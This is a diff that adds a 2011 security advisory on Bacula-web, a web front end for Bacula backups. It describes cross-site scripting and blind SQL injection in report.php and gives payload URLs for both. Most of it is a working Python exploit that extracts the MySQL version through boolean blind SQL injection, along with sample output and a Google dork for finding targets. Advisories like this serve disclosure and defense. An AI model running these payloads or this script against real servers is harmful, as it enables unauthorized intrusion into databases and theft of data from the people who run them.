@@ -1,0 +1,186 @@
+GotGeek Labs
+http://www.gotgeek.com.br/
+
+Bacula-web 1.3.x - 5.0.3 Multiple Remote Vulnerabilities
+
+
+
+[+] Description
+
+Bacula-Web is a web based tool that provide you a summarized
+view of your bacula director.
+It obtain his information from your bacula catalog's database.
+It provide some usefull informations such as:
+    * Last 24 hours jobs status (completed, failed, waiting, etc.)
+    * Medias and Pool usage
+    * Last 7 days storage usage
+
+The main advantages of this tool are
+    * it's web based, so you can reach it simply through your
+      preferred browser from anywhere
+    * it's pretty easy to install (you just need a LAMP server with
+      a valid Bacula catalog database connection)
+    * it contain a lot of information into a single page (have a
+      look on your last jobs for example)
+
+This is a fairly high level Bacula management tool.
+
+
+
+[+] Information
+
+Title: Bacula-web 1.3.x - 5.0.3 Multiple Remote Vulnerabilities
+Google Dork: intitle:bacula-web "Status"
+Advisory: gg-004-2011
+Date: 02-22-2011
+Last update: 03-04-2011
+Link: http://www.gotgeek.com.br/pocs/gg-004-2011.txt
+Tested on: FreeBSD 7.2-RELEASE + MySQL 5.x
+
+
+
+[+] Vulnerabilities
+
+Cross-site Scripting:
+Bacula-web is affected by cross-site scripting vulnerability because
+it fails to properly sanitize user-supplied input.
+An attacker may leverage this issue to execute arbitrary script code
+in the browser of an unsuspecting user in the context of the affected site.
+
+XSS:
+http://target/bacula/report.php?default=1&server=Backup_inc<script>alert("xss")</script>
+
+Blind SQL Injection:
+Bacula-web is also affected by blind SQL injection vulnerability because it fails
+to sufficiently sanitize user-supplied data before using it in an SQL query.
+Exploiting these issues could allow an attacker to compromise the
+application, access or modify data, or exploit latent vulnerabilities
+in the underlying database.
+
+*Blind SQLi:
+http://target/bacula/report.php?default=1&server=Backup_inc' and 1='2	#FALSE
+http://target/bacula/report.php?default=1&server=Backup_inc' and 1='1	#TRUE
+
+*Need a valid job name at server variable with some data to get false or true page.
+
+
+Affected Versions:
+(1)Bacula-web 5.0.3
+(2)Bacula-web 1.38.9_1 (FreeBSD)
+
+Other versions may also be vulnerable.
+
+
+
+[+] Proof of Concept/Exploit
+
+# $ python bacula-web.py -t 10.1.1.1 -d /bacula/ -j Backup_inc -p 80
+#
+# [*] gotgeek labs
+# [*] http://gotgeek.com.br
+#
+#
+# [*] Checking report.php...
+# [+] Found!
+# [*] Let's get MySQL version.. Wait a moment...
+# [+] MySQL: 5.0.84
+#
+# [*]Done!
+
+
+#!/usr/bin/python
+#
+
+import sys
+import httplib, socket
+import urllib, re
+from optparse import OptionParser
+
+# You may also use "MB".. Check your target before!
+truestr = "GB"
+usage = "./%prog -t <target> -d <dir> -j <job> -p <port>\n"
+usage+= "Example: ./%prog -t www.example.com -d /bacula-web/ -j BackupCatalog -p 80"
+
+parser = OptionParser(usage=usage)
+parser.add_option("-t", action="store", dest="target",
+                  help="target server")
+parser.add_option("-d", action="store", dest="dir",
+                  help="path to bacula-web")
+parser.add_option("-j", action="store", dest="job",
+                  help="bacula job name")
+parser.add_option("-p", action="store", dest="port",
+                  help="server port")
+(options, args) = parser.parse_args()
+
+def banner():
+    print "\n[*] gotgeek labs"
+    print "[*] http://gotgeek.com.br\n\n"
+
+if len(sys.argv) < 5:
+    banner()
+    parser.print_help()
+    sys.exit(1)
+
+
+def checkurl():
+    try:
+        print "[*] Checking report.php..."
+        conn = httplib.HTTPConnection(options.target+":"+options.port)
+        conn.request("GET", options.dir + "report.php")
+        r1 = conn.getresponse()
+        if r1.status == 200:
+            print "[+] Found!"
+        else:
+            print "[-] NOT Found!\n\n"
+            sys.exit(1)
+    except socket.error, msg:
+        print "[-] Can't connect to the target!\n\n"
+        sys.exit(1)
+
+
+def geturl(sqli):
+    try:
+        check = urllib.urlopen("http://"+options.target+":"+options.port+options.dir+sqli).read()
+    except:
+        print "[-] Can't connect to the target!\n\n"
+        sys.exit(1)
+    return check
+
+
+def getmysql(gg):
+    for i in range(43,58):
+        request = ("report.php?default=1&server="+options.job+"'%20and%20ascii(substring(@@version,"+str(gg)+",1))='"+str(i))
+        result = geturl(request)
+        if re.search(truestr,result):
+            gg = gg+1
+            sys.stdout.write(chr(i))
+            sys.stdout.flush()
+            getmysql(gg)
+            break
+
+
+
+def main():
+    gg = 1
+    banner()
+    checkurl()
+    print "[*] Let's get MySQL version.. Wait a moment..."
+    sys.stdout.write("[+] MySQL: ")
+    getmysql(gg)
+    print "\n\n[*]Done!\n\n"
+
+if __name__ == "__main__":
+    main()
+
+
+
+[+] References
+
+(1)http://bacula-web.dflc.ch/index.php/home.html
+(2)http://www.freshports.org/www/bacula-web/
+
+
+
+[+] Credits
+
+b0telh0
